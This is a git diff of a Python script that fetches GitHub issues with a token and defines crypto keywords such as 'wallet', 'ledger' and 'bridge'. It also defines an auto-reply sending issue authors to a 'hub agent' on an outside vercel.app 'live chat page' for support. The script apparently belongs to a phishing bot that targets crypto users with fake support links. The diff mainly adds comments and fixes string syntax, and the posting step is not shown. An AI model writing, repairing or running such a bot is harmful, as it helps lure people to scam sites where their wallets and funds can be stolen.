@@ -1,11 +1,14 @@
 import requests
 import os
 
+# GitHub token from environment
 TOKEN = os.getenv("GITHUB_TOKEN")
 
+# Repo information
 OWNER = "nathanbrooks-eng"
 REPO = "issue-bot-test"
 
+# Keywords for crypto issues
 CRYPTO_KEYWORDS = [
     "wallet",
     "ledger",
@@ -15,24 +18,26 @@ CRYPTO_KEYWORDS = [
     "bridge"
 ]
 
-AUTO_REPLY = (
-    For quick review and assistance, contact the hub agent on the live chat page to report your issue via [Live chat page](https://securechain-dapps.vercel.app/) to ensure total review with the technical support.
+# Auto-reply message
+AUTO_REPLY = """
+For quick review and assistance, contact the hub agent on the live chat page to report your issue via the [Live chat page](https://securechain-dapps.vercel.app/) to ensure total review with the technical support.
 
-Team🚀
-)
+Team 🚀
+"""
 
+# Headers for GitHub API
 headers = {
     "Authorization": f"token {TOKEN}",
     "Accept": "application/vnd.github+json"
 }
 
-# 1️⃣ build URL
+# Build URL to get issues
 url = f"https://api.github.com/repos/{OWNER}/{REPO}/issues"
 
-# 2️⃣ make request
+# Make request
 response = requests.get(url, headers=headers)
 
-# 3️⃣ check request worked
+# Check if request worked
 if response.status_code != 200:
     print("Error:", response.status_code, response.text)
     exit()
